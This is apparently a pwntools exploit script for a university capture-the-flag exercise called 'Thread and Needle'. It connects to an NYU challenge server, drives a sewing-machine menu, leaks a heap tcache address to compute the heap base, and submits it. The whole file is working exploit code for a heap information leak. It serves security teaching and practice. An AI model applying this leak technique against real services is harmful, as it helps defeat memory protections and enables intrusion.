from pwn import *

connection = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1211)

log.info("Thread and Needle Exploit Script")
log.info("Sending NetID: <NET ID>")
connection.recvuntil("abc123): ".encode())
connection.sendline("<NET ID>".encode())
connection.recvuntil("...")
log.success("Successfully authenticated!")

def configure_machine(product, length, stitch):
    log.info(f"Configuring machine with product: {product.decode()}, length: {length}, stitch: {stitch.decode()}")
    connection.sendlineafter(b"> ", b"1")
    connection.sendlineafter(b"> ", product)
    connection.sendlineafter(b"> ", str(length).encode())
    connection.sendlineafter(b"> ", stitch)
    connection.sendline()
def modify_configuration(option):
    log.info(f"Modifying configuration: option {option}")
    connection.sendlineafter(b"> ", b"2")
    connection.sendlineafter(b"> ", str(option).encode())
def create_product():
    log.info("Creating the product...")
    connection.sendlineafter(b"> ", b"3")
    connection.sendline()
def extract_tcache_address():
    log.info("Leaking tcache_perthread_struct address...")
    modify_configuration(2)
    leak_data = connection.recvline().strip().split(b": ")[1]
    tcache_address = int(leak_data, 16)
    log.success(f"Extracted tcache_perthread_struct address: {hex(tcache_address)}")
    return tcache_address

log.info("Starting sewing machine setup...")
configure_machine(b"dress", 10, b"ladder")
create_product()
log.info("Calculating heap base address...")
tcache_address = extract_tcache_address()
heap_base_address = tcache_address & ~0xfff
log.success(f"Calculated Heap Base Address: {hex(heap_base_address)}")

log.info("Submitting heap base address...")
connection.sendlineafter(b"> ", b"\n")
connection.sendlineafter(b"> ", b"\n")
connection.sendlineafter(b"> ", b"\n")
connection.sendafter(b"any guesses?", str(heap_base_address).encode())
log.info("All done! Switching to interactive mode...")
connection.interactive()
